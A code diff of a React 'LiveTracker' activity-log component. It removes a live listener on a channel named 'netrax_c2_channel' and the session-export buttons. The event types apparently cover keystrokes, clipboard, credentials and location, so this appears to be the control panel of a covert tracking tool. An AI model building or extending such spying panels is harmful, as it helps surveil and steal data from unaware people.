@@ -1,16 +1,13 @@
 
 'use client';
 
-import { useState, useEffect } from 'react';
-import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
-import { Button } from '@/components/ui/button';
-import { Badge } from '@/components/ui/badge';
 import { ScrollArea } from '@/components/ui/scroll-area';
-import { Workflow, FileDown, Trash2, Keyboard, MousePointer, CaseUpper, FileInput, Monitor, MapPin, Network, Scan, Clipboard, Lock, AlertCircle, History, Download, Eye, Bot, Key } from 'lucide-react';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
+import { Workflow, Keyboard, MousePointer, CaseUpper, FileInput, Monitor, MapPin, Network, Scan, Clipboard, Lock, AlertCircle, History, Download, Eye, Bot, Key } from 'lucide-react';
 
 export type TrackedEvent = {
   sessionId: string;
-  type: string; // Keep as string to accommodate new event types
+  type: string;
   data: any;
   timestamp: string;
   url: string;
@@ -19,10 +16,7 @@ export type TrackedEvent = {
 
 type LiveTrackerProps = {
     sessions: Map<string, TrackedEvent[]>;
-    setSessions: (sessions: Map<string, TrackedEvent[]>) => void;
     selectedSessionId: string | null;
-    setSelectedSessionId: React.Dispatch<React.SetStateAction<string | null>>;
-    resetState: () => void;
 }
 
 const getEventIcon = (type: TrackedEvent['type']) => {
@@ -71,51 +65,8 @@ const formatEventData = (event: TrackedEvent) => {
     }
 };
 
-export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelectedSessionId, resetState }: LiveTrackerProps) {
-
-  useEffect(() => {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-
-    const handleMessage = (event: MessageEvent<TrackedEvent>) => {
-      const newEvent = event.data;
-      if (!newEvent.sessionId) return;
-      const currentSessionEvents = sessions.get(newEvent.sessionId) || [];
-      const updatedEvents = [...currentSessionEvents, newEvent];
-      const newSessions = new Map(sessions.set(newEvent.sessionId, updatedEvents));
-      setSessions(newSessions);
-    };
-
-    channel.addEventListener('message', handleMessage);
-
-    return () => {
-      channel.removeEventListener('message', handleMessage);
-      channel.close();
-    };
-  }, [setSessions, sessions]);
-
+export function LiveTracker({ sessions, selectedSessionId }: LiveTrackerProps) {
   const selectedSessionEvents = selectedSessionId ? sessions.get(selectedSessionId) || [] : [];
-  
-  const downloadFile = (content: string, fileName: string, contentType: string) => {
-    const a = document.createElement("a");
-    const file = new Blob([content], { type: contentType });
-    a.href = URL.createObjectURL(file);
-    a.download = fileName;
-    a.click();
-    URL.revokeObjectURL(a.href);
-  };
-  
-  const handleExport = (format: 'json' | 'txt') => {
-      if (!selectedSessionId || selectedSessionEvents.length === 0) return;
-      const fileName = `session_${selectedSessionId}_log`;
-      
-      if (format === 'json') {
-          const content = JSON.stringify(selectedSessionEvents, null, 2);
-          downloadFile(content, `${fileName}.json`, 'application/json');
-      } else {
-          const content = selectedSessionEvents.map(e => `[${e.timestamp}] [${e.type.toUpperCase()}] ${formatEventData(e)}`).join('\\n');
-          downloadFile(content, `${fileName}.txt`, 'text/plain');
-      }
-  };
   
   return (
       <Card className="flex-grow flex flex-col">
@@ -124,10 +75,6 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
             <div>
               <CardTitle className="flex items-center gap-2"><Workflow className="h-5 w-5"/> Activity Log</CardTitle>
               <CardDescription className="truncate">{selectedSessionId || 'No session selected'}</CardDescription>
-            </div>
-            <div className="flex gap-2">
-                 <Button onClick={() => handleExport('json')} variant="outline" size="sm" disabled={!selectedSessionId}><FileDown className="mr-2 h-4 w-4"/>Export JSON</Button>
-                 <Button onClick={() => handleExport('txt')} variant="outline" size="sm" disabled={!selectedSessionId}><FileDown className="mr-2 h-4 w-4"/>Export TXT</Button>
             </div>
           </div>
         </CardHeader>
@@ -157,4 +104,3 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
       </Card>
   );
 }
-
